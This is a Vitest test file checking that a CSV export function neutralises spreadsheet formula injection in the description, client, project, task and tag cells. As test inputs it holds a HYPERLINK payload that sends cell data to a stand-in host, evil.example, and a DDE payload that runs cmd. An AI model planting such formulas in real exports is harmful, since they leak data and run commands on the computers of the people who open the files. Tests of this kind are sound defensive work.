// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { exportToCSV } from "./exportUtils";

let captured: Blob | null = null;

beforeEach(() => {
  captured = null;
  vi.stubGlobal("URL", {
    createObjectURL: (blob: Blob) => {
      captured = blob;
      return "blob:test";
    },
    revokeObjectURL: () => {},
  });
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

function entry(overrides: Record<string, unknown> = {}) {
  return {
    start: "2026-03-10T15:00:00.000Z",
    stop: "2026-03-10T16:30:00.000Z",
    duration: 5400,
    description: "Weekly sync",
    projectName: "Project A",
    clientName: "Client A",
    taskName: null,
    billable: true,
    amount: 150,
    tags: ["ops", "review"],
    ...overrides,
  };
}

async function exportedLines(entries: ReturnType<typeof entry>[], options = {}): Promise<string[]> {
  exportToCSV(entries, "t", options);
  const text = await new Promise<string>((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(String(reader.result));
    reader.onerror = () => reject(reader.error);
    reader.readAsText(captured as Blob);
  });
  return text.split("\n");
}

describe("exportToCSV formula injection", () => {
  it("neutralizes the HYPERLINK exfiltration payload in a text cell", async () => {
    const payload = '=HYPERLINK("http://evil.example/exfil?c="&A1,"click me")';
    const [, row] = await exportedLines([entry({ description: payload })]);
    expect(row).toContain(`"'=HYPERLINK(""http://evil.example/exfil?c=""&A1,""click me"")"`);
    expect(row).not.toContain(`,"=HYPERLINK`);
  });

  it("neutralizes the DDE command payload in a text cell", async () => {
    const [, row] = await exportedLines([entry({ description: "=cmd|'/C calc'!A1" })]);
    expect(row).toContain(`"'=cmd|'/C calc'!A1"`);
    expect(row).not.toContain(`,"=cmd`);
  });

  it.each(["=1+1", "+1+1", "-1+1", "@SUM(A1)", "\t=1+1", "\r=1+1"])(
    "prefixes a text cell that starts with %j",
    async (value) => {
      const [, row] = await exportedLines([entry({ description: value })]);
      expect(row).toContain(`"'${value}"`);
    }
  );

  it("neutralizes formulas planted in client, project, task and tag cells too", async () => {
    const [, row] = await exportedLines([
      entry({ clientName: "=1+1", projectName: "@x", taskName: "+x", tags: ["-x"] }),
    ]);
    const cells = row.split('","');
    expect(cells.some((c) => c.startsWith("=") || c.startsWith("@") || c.startsWith("+"))).toBe(false);
    expect(row).toContain(`"'=1+1"`);
    expect(row).toContain(`"'@x"`);
    expect(row).toContain(`"'+x"`);
    expect(row).toContain(`"'-x"`);
  });

  it("leaves a normal export byte-identical, with numeric cells (even negative) untouched", async () => {
    const lines = await exportedLines([entry({ amount: -5 })]);
    expect(lines[0]).toBe("Date,Start,Stop,Duration,Description,Client,Project,Task,Billable,Amount,Tags");
    expect(lines[1]).toBe(
      '"2026-03-10","10:00","11:30","01:30:00","Weekly sync","Client A","Project A","","Yes",-5,"ops, review"'
    );
  });

  it("does not touch a description that merely contains a trigger character later on", async () => {
    const [, row] = await exportedLines([entry({ description: 'Fix a=b and "quote"' })]);
    expect(row).toContain('"Fix a=b and ""quote"""');
  });
});
